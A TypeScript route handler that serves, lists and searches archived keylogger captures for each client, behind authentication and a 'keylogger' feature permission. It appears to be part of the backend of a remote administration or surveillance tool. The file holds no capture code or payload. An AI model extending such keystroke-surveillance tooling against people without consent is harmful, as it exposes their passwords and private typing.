import { authenticateRequest } from "../../auth";
import { canUserAccessClient } from "../../users";
import { requireFeatureAccess } from "../../rbac";
import {
  getArchivedKeylogContent,
  listArchivedKeylogs,
  searchArchivedKeylogs,
} from "../keylog-archive";

type KeylogArchiveRouteDeps = {
  CORS_HEADERS: Record<string, string>;
};

function parseClientArchivePath(pathname: string): { clientId: string; action: string } | null {
  const match = pathname.match(/^\/api\/clients\/([^/]+)\/keylogger\/archive(?:\/([^/]+))?$/);
  if (!match) return null;
  return {
    clientId: decodeURIComponent(match[1]),
    action: match[2] || "list",
  };
}

async function requireArchiveAccess(req: Request, clientId: string) {
  const user = await authenticateRequest(req);
  if (!user) return { response: new Response("Unauthorized", { status: 401 }) };
  if (!canUserAccessClient(user.userId, user.role, clientId)) {
    return { response: new Response("Forbidden", { status: 403 }) };
  }
  try {
    requireFeatureAccess(user, "keylogger");
  } catch (error) {
    if (error instanceof Response) return { response: error };
    return { response: new Response("Forbidden", { status: 403 }) };
  }
  return { user };
}

export async function handleKeylogArchiveRoutes(
  req: Request,
  url: URL,
  deps: KeylogArchiveRouteDeps,
): Promise<Response | null> {
  const parsed = parseClientArchivePath(url.pathname);
  if (!parsed) return null;

  const access = await requireArchiveAccess(req, parsed.clientId);
  if (access.response) return access.response;

  if (req.method === "GET" && parsed.action === "list") {
    return Response.json({ files: listArchivedKeylogs(parsed.clientId) }, { headers: deps.CORS_HEADERS });
  }

  if (req.method === "GET" && parsed.action === "content") {
    const filename = (url.searchParams.get("filename") || "").trim();
    if (!filename) return Response.json({ error: "filename is required" }, { status: 400, headers: deps.CORS_HEADERS });
    const content = getArchivedKeylogContent(parsed.clientId, filename);
    if (!content) return Response.json({ error: "Archived file not found" }, { status: 404, headers: deps.CORS_HEADERS });
    return Response.json(content, { headers: deps.CORS_HEADERS });
  }

  if (req.method === "GET" && parsed.action === "search") {
    const query = (url.searchParams.get("q") || "").trim();
    if (query.length < 3) return Response.json({ results: [] }, { headers: deps.CORS_HEADERS });
    return Response.json({ results: searchArchivedKeylogs(parsed.clientId, query) }, { headers: deps.CORS_HEADERS });
  }

  return new Response("Method not allowed", { status: 405, headers: deps.CORS_HEADERS });
}
